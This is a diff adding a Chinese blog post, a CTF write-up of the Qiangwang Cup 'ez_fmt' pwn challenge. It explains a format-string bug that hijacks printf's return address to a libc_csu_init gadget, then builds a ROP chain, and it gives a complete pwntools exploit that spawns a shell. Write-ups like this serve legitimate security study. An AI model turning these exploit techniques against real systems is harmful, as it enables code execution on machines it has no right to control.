@@ -1,0 +1,163 @@
+<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0,viewport-fit=cover"><title>强网杯ez_fmt复现 | k0rian's blog</title><meta name="author" content="k0rian"><meta name="copyright" content="k0rian"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="ez_fmt本来想着用格式化字符串低位爆破，不过看了别的师傅的文章，似乎有更为巧妙的思路。先给大家看看题目 1234567891011121314151617nt __cdecl main(int argc, const char **argv, const char **envp)&#123;  char buf[88]; &#x2F;&#x2F; [rsp+0h] [rbp-60h] BYREF  unsigne">
+<meta property="og:type" content="article">
+<meta property="og:title" content="强网杯ez_fmt复现">
+<meta property="og:url" content="http://example.com/posts/ez_fmt.html">
+<meta property="og:site_name" content="k0rian&#39;s blog">
+<meta property="og:description" content="ez_fmt本来想着用格式化字符串低位爆破，不过看了别的师傅的文章，似乎有更为巧妙的思路。先给大家看看题目 1234567891011121314151617nt __cdecl main(int argc, const char **argv, const char **envp)&#123;  char buf[88]; &#x2F;&#x2F; [rsp+0h] [rbp-60h] BYREF  unsigne">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="http://example.com/img/favicon.jpg">
+<meta property="article:published_time" content="2024-01-25T16:00:00.000Z">
+<meta property="article:modified_time" content="2024-01-26T04:16:35.465Z">
+<meta property="article:author" content="k0rian">
+<meta property="article:tag" content="-子函数劫持 -格式化字符串">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://example.com/img/favicon.jpg"><link rel="shortcut icon" href="/img/favicon.jpg"><link rel="canonical" href="http://example.com/posts/ez_fmt.html"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css?v=4.12.0"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@6.5.1/css/all.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/ui@5.0.32/dist/fancybox/fancybox.min.css" media="print" onload="this.media='all'"><script>const GLOBAL_CONFIG = {
+  root: '/',
+  algolia: undefined,
+  localSearch: {"path":"/search.xml","preload":false,"top_n_per_article":1,"unescape":false,"languages":{"hits_empty":"找不到您查询的内容：${query}","hits_stats":"共找到 ${hits} 篇文章"}},
+  translate: undefined,
+  noticeOutdate: undefined,
+  highlight: {"plugin":"highlight.js","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false},
+  copy: {
+    success: '复制成功',
+    error: '复制错误',
+    noSupport: '浏览器不支持'
+  },
+  relativeDate: {
+    homepage: false,
+    post: false
+  },
+  runtime: '',
+  dateSuffix: {
+    just: '刚刚',
+    min: '分钟前',
+    hour: '小时前',
+    day: '天前',
+    month: '个月前'
+  },
+  copyright: undefined,
+  lightbox: 'fancybox',
+  Snackbar: undefined,
+  infinitegrid: {
+    js: 'https://cdn.jsdelivr.net/npm/@egjs/infinitegrid@4.11.0/dist/infinitegrid.min.js',
+    buttonText: '加载更多'
+  },
+  isPhotoFigcaption: false,
+  islazyload: false,
+  isAnchor: false,
+  percent: {
+    toc: true,
+    rightside: false,
+  },
+  autoDarkmode: false
+}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
+  title: '强网杯ez_fmt复现',
+  isPost: true,
+  isHome: false,
+  isHighlightShrink: false,
+  isToc: true,
+  postUpdate: '2024-01-26 12:16:35'
+}</script><script>(win=>{
+      win.saveToLocal = {
+        set: (key, value, ttl) => {
+          if (ttl === 0) return
+          const now = Date.now()
+          const expiry = now + ttl * 86400000
+          const item = {
+            value,
+            expiry
+          }
+          localStorage.setItem(key, JSON.stringify(item))
+        },
+      
+        get: key => {
+          const itemStr = localStorage.getItem(key)
+      
+          if (!itemStr) {
+            return undefined
+          }
+          const item = JSON.parse(itemStr)
+          const now = Date.now()
+      
+          if (now > item.expiry) {
+            localStorage.removeItem(key)
+            return undefined
+          }
+          return item.value
+        }
+      }
+    
+      win.getScript = (url, attr = {}) => new Promise((resolve, reject) => {
+        const script = document.createElement('script')
+        script.src = url
+        script.async = true
+        script.onerror = reject
+        script.onload = script.onreadystatechange = function() {
+          const loadState = this.readyState
+          if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+          script.onload = script.onreadystatechange = null
+          resolve()
+        }
+
+        Object.keys(attr).forEach(key => {
+          script.setAttribute(key, attr[key])
+        })
+
+        document.head.appendChild(script)
+      })
+    
+      win.getCSS = (url, id = false) => new Promise((resolve, reject) => {
+        const link = document.createElement('link')
+        link.rel = 'stylesheet'
+        link.href = url
+        if (id) link.id = id
+        link.onerror = reject
+        link.onload = link.onreadystatechange = function() {
+          const loadState = this.readyState
+          if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+          link.onload = link.onreadystatechange = null
+          resolve()
+        }
+        document.head.appendChild(link)
+      })
+    
+      win.activateDarkMode = () => {
+        document.documentElement.setAttribute('data-theme', 'dark')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
+        }
+      }
+      win.activateLightMode = () => {
+        document.documentElement.setAttribute('data-theme', 'light')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
+        }
+      }
+      const t = saveToLocal.get('theme')
+    
+        if (t === 'dark') activateDarkMode()
+        else if (t === 'light') activateLightMode()
+      
+      const asideStatus = saveToLocal.get('aside-status')
+      if (asideStatus !== undefined) {
+        if (asideStatus === 'hide') {
+          document.documentElement.classList.add('hide-aside')
+        } else {
+          document.documentElement.classList.remove('hide-aside')
+        }
+      }
+    
+      const detectApple = () => {
+        if(/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)){
+          document.documentElement.classList.add('apple')
+        }
+      }
+      detectApple()
+    })(window)</script><meta name="generator" content="Hexo 7.0.0"></head><body><div id="web_bg"></div><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img is-center"><img src="/img/favicon.jpg" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="sidebar-site-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">2</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">1</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">0</div></a></div><hr class="custom-hr"/></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url('/img/background.jpg')"><nav id="nav"><span id="blog-info"><a href="/" title="k0rian's blog"><span class="site-name">k0rian's blog</span></a></span><div id="menus"><div id="search-button"><a class="site-page social-icon search" href="javascript:void(0);"><i class="fas fa-search fa-fw"></i><span> 搜索</span></a></div><div id="toggle-menu"><a class="site-page" href="javascript:void(0);"><i class="fas fa-bars fa-fw"></i></a></div></div></nav><div id="post-info"><h1 class="post-title">强网杯ez_fmt复现</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2024-01-25T16:00:00.000Z" title="发表于 2024-01-26 00:00:00">2024-01-26</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2024-01-26T04:16:35.465Z" title="更新于 2024-01-26 12:16:35">2024-01-26</time></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title="强网杯ez_fmt复现"><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">阅读量:</span><span id="busuanzi_value_page_pv"><i class="fa-solid fa-spinner fa-spin"></i></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container"><h2 id="ez-fmt"><a href="#ez-fmt" class="headerlink" title="ez_fmt"></a>ez_fmt</h2><p>本来想着用格式化字符串低位爆破，不过看了别的师傅的文章，似乎有更为巧妙的思路。<br>先给大家看看题目</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">nt __cdecl main(int argc, const char **argv, const char **envp)</span><br><span class="line">&#123;</span><br><span class="line">  char buf[88]; // [rsp+0h] [rbp-60h] BYREF</span><br><span class="line">  unsigned __int64 v5; // [rsp+58h] [rbp-8h]</span><br><span class="line"></span><br><span class="line">  v5 = __readfsqword(0x28u);</span><br><span class="line">  setvbuf(stdout, 0LL, 2, 0LL);</span><br><span class="line">  setvbuf(stdin, 0LL, 2, 0LL);</span><br><span class="line">  printf(&quot;There is a gift for you %p\n&quot;, buf);</span><br><span class="line">  read(0, buf, 0x30uLL);</span><br><span class="line">  if ( w == 0xFFFF )</span><br><span class="line">  &#123;</span><br><span class="line">    printf(buf);</span><br><span class="line">    w = 0;</span><br><span class="line">  &#125;</span><br><span class="line">  return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>题目逻辑很简单，给了一个栈上的地址，然后有个只能利用一次的格式化字符串漏洞，这里如果想要在泄露libc基址，并同时劫持main的返回地址和w，0x30个字节显然是不够的，所以要另辟蹊径，尝试劫持<strong>子函数的返回地址</strong>，我们知道，在调用一个函数前,要先push rip，push rbp,把当前函数的执行状态和堆栈保留下来，而这里，题目把一个栈上的地址给我们，劫持子函数的返回地址是办得到的，gdb发现printf(buf)的返回地址刚好就在rsp上方，也就是rsp-8的位置，那我们就可以通过格式化字符串修改这个返回地址，从而控制整个程序。</p>
+<h2 id="执行到printf-buf-时的栈"><a href="#执行到printf-buf-时的栈" class="headerlink" title="执行到printf(buf)时的栈"></a>执行到printf(buf)时的栈</h2><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">00:0000│ rsp     0x7fffe5c1e828 —▸ 0x40123e (main+168) ◂— mov dword ptr [rip + 0x2dc8], 0</span><br><span class="line">01:0008│ rdi rsi 0x7fffe5c1e830 ◂— 0x2438256336303225 (&#x27;%206c%8$&#x27;)</span><br><span class="line">02:0010│         0x7fffe5c1e838 ◂— 0x70243931256e6868 (&#x27;hhn%19$p&#x27;)</span><br><span class="line">03:0018│         0x7fffe5c1e840 —▸ 0x7fffe5c1e828 —▸ 0x40123e (main+168) ◂— mov dword ptr [rip + 0x2dc8], 0</span><br><span class="line">04:0020│         0x7fffe5c1e848 —▸ 0x401205 (main+111) ◂— lea rax, [rbp - 0x60]</span><br><span class="line">05:0028│         0x7fffe5c1e850 —▸ 0x7f71461015e0 ◂— endbr64 </span><br><span class="line">06:0030│         0x7fffe5c1e858 —▸ 0x4012bd (<span class="strong">__libc<span class="emphasis">_csu_</span>init+77) ◂— add rbx, 1</span></span><br><span class="line"><span class="strong">07:0038│         0x7fffe5c1e860 —▸ 0x7f71460fc2e8 ◂— 0x0</span></span><br><span class="line"><span class="strong">08:0040│         0x7fffe5c1e868 —▸ 0x401270 (__</span>libc<span class="emphasis">_csu_</span>init) ◂— endbr64 </span><br><span class="line">09:0048│         0x7fffe5c1e870 ◂— 0x0</span><br><span class="line">0a:0050│         0x7fffe5c1e878 —▸ 0x4010b0 (<span class="emphasis">_start) ◂— endbr64 </span></span><br><span class="line"><span class="emphasis">0b:0058│         0x7fffe5c1e880 —▸ 0x7fffe5c1e980 ◂— 0x1</span></span><br><span class="line"><span class="emphasis">0c:0060│         0x7fffe5c1e888 ◂— 0xf4bc6e9f9994b300</span></span><br><span class="line"><span class="emphasis">0d:0068│ rbp     0x7fffe5c1e890 ◂— 0x0</span></span><br><span class="line"><span class="emphasis">0e:0070│         0x7fffe5c1e898 —▸ 0x7f7145f2f083 (<span class="strong">__libc_start_main+243) ◂— mov edi, eax</span></span></span><br></pre></td></tr></table></figure>
+<p>我们可以看到此时push了一个返回地址上去，<del>0x40123e</del>,这就是我们要劫持的返回地址了，当然，劫持一个可能还不够，为了实现rop，我们至少需要写0x18个字节进去，但这里buf有长度限制，仅用格式化字符串显然是不够的。显然需要换一种思路。我们知道,ret相当于pop rip,那也就是说只需要把rsp控制到我们写入的位置就可以了，这里为了避免格式化字符串和我们写入的返回地址冲突，我们用<del>libc_csu_init</del>中的gadget来控制rsp。需要注意的是，在rop之前我们需要先泄露一个libc函数的地址来拿到libc_base。这一步可以放到格式化字符串那一步做。csu的pop执行完后，我们就可以利用ret来继续劫持程序流。<br><strong>所以我们的总体思路就是</strong>:<del>格式化字符串劫持子函数的返回地址到libc_csu_init</del>-&gt;<del>利用其中的pop|ret劫持程序流到read</del>-&gt;<del>利用read写入rop链，同时劫持read函数的返回地址</del></p>
+<h2 id="exp"><a href="#exp" class="headerlink" title="exp:"></a>exp:</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#from LibcSearcher import *</span></span><br><span class="line">p=process(<span class="string">&quot;./ez_fmt&quot;</span>)</span><br><span class="line">libc=ELF(<span class="string">&quot;./libc-2.31.so&quot;</span>)</span><br><span class="line">gdb.attach(p)</span><br><span class="line">p.recvuntil(<span class="string">b&quot;0x&quot;</span>)</span><br><span class="line">buf_addr=<span class="string">&quot;0x&quot;</span>+p.recvuntil(<span class="string">&quot;\n&quot;</span>)[:-<span class="number">1</span>].decode(<span class="string">&quot;utf-8&quot;</span>)</span><br><span class="line">buf_addr=<span class="built_in">int</span>(buf_addr,<span class="number">16</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(buf_addr))</span><br><span class="line">read_addr=<span class="number">0x401205</span></span><br><span class="line">offset=<span class="number">0x18</span></span><br><span class="line">payload=<span class="string">b&quot;%206c%8$hhn%19$p&quot;</span>+p64(buf_addr-<span class="number">8</span>)+p64(read_addr)</span><br><span class="line">payload.ljust(<span class="number">0x30</span>,<span class="string">b&quot;a&quot;</span>)</span><br><span class="line">p.send(payload)</span><br><span class="line">p.recvuntil(<span class="string">&quot;0x&quot;</span>)</span><br><span class="line">libc_base=<span class="built_in">int</span>(<span class="string">&quot;0x&quot;</span>+p.recv(<span class="number">12</span>).decode(<span class="string">&quot;utf-8&quot;</span>),<span class="number">16</span>)-libc.sym[<span class="string">&quot;__libc_start_main&quot;</span>]-<span class="number">243</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(libc_base))</span><br><span class="line">pop_rdi=<span class="number">0x00000000004012d3</span></span><br><span class="line">system=libc_base+libc.sym[<span class="string">&quot;system&quot;</span>]</span><br><span class="line">bin_sh=libc_base+<span class="built_in">next</span>(libc.search(<span class="string">b&quot;/bin/sh\x00&quot;</span>))</span><br><span class="line">one=<span class="number">0xe3b04</span></span><br><span class="line">payload=<span class="string">b&quot;a&quot;</span>*<span class="number">0x18</span>+p64(pop_rdi)+p64(bin_sh)+p64(libc_base+<span class="number">0x051CD2</span>)</span><br><span class="line"><span class="comment">#pause()</span></span><br><span class="line"><span class="comment">#payload=b&quot;a&quot;*0x18+p64(one)</span></span><br><span class="line">p.send(payload)</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(bin_sh))</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+<p><strong>参考文献</strong>:<a target="_blank" rel="noopener" href="https://www.cnblogs.com/S1nyer/p/17914751.html">https://www.cnblogs.com/S1nyer/p/17914751.html</a></p>
+</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta"><i class="fas fa-circle-user fa-fw"></i>文章作者: </span><span class="post-copyright-info"><a href="http://example.com">k0rian</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta"><i class="fas fa-square-arrow-up-right fa-fw"></i>文章链接: </span><span class="post-copyright-info"><a href="http://example.com/posts/ez_fmt.html">http://example.com/posts/ez_fmt.html</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta"><i class="fas fa-circle-exclamation fa-fw"></i>版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来自 <a href="http://example.com" target="_blank">k0rian's blog</a>！</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/%E5%AD%90%E5%87%BD%E6%95%B0%E5%8A%AB%E6%8C%81-%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2/">-子函数劫持 -格式化字符串</a></div><div class="post_share"><div class="social-share" data-image="/img/favicon.jpg" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.3/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.3/sharejs/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><div class="next-post pull-full"><a href="/posts/HackNote.html" title="HackNote"><div class="cover" style="background: var(--default-bg-color)"></div><div class="pagination-info"><div class="label">下一篇</div><div class="next_info">HackNote</div></div></a></div></nav></div><div class="aside-content" id="aside-content"><div class="card-widget card-info"><div class="is-center"><div class="avatar-img"><img src="/img/favicon.jpg" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info__name">k0rian</div><div class="author-info__description">没人？打个胶先</div></div><div class="card-info-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">2</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">1</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">0</div></a></div><a id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/xxxxxx"><i class="fab fa-github"></i><span>Follow Me</span></a></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn fa-shake"></i><span>公告</span></div><div class="announcement_content">This is my Blog</div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>目录</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#ez-fmt"><span class="toc-number">1.</span> <span class="toc-text">ez_fmt</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%89%A7%E8%A1%8C%E5%88%B0printf-buf-%E6%97%B6%E7%9A%84%E6%A0%88"><span class="toc-number">2.</span> <span class="toc-text">执行到printf(buf)时的栈</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#exp"><span class="toc-number">3.</span> <span class="toc-text">exp:</span></a></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>最新文章</span></div><div class="aside-list"><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/posts/ez_fmt.html" title="强网杯ez_fmt复现">强网杯ez_fmt复现</a><time datetime="2024-01-25T16:00:00.000Z" title="发表于 2024-01-26 00:00:00">2024-01-26</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/posts/HackNote.html" title="HackNote">HackNote</a><time datetime="2024-01-17T11:53:48.000Z" title="发表于 2024-01-17 19:53:48">2024-01-17</time></div></div></div></div></div></div></main><footer id="footer" style="background-image: url('/img/background.jpg')"><div id="footer-wrap"><div class="copyright">&copy;2020 - 2024 By k0rian</div><div class="framework-info"><span>框架 </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo</a><span class="footer-separator">|</span><span>主题 </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly</a></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="浅色和深色模式转换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside-config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="fas fa-list-ul"></i></button><button id="go-up" type="button" title="回到顶部"><span class="scroll-percent"></span><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js?v=4.12.0"></script><script src="/js/main.js?v=4.12.0"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/ui@5.0.32/dist/fancybox/fancybox.umd.min.js"></script><div class="js-pjax"></div><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script><div id="local-search"><div class="search-dialog"><nav class="search-nav"><span class="search-dialog-title">搜索</span><span id="loading-status"></span><button class="search-close-button"><i class="fas fa-times"></i></button></nav><div class="is-center" id="loading-database"><i class="fas fa-spinner fa-pulse"></i><span>  数据库加载中</span></div><div class="search-wrap"><div id="local-search-input"><div class="local-search-box"><input class="local-search-box--input" placeholder="搜索文章" type="text"/></div></div><hr/><div id="local-search-results"></div><div id="local-search-stats-wrap"></div></div></div><div id="search-mask"></div><script src="/js/search/local-search.js?v=4.12.0"></script></div></div></body></html>
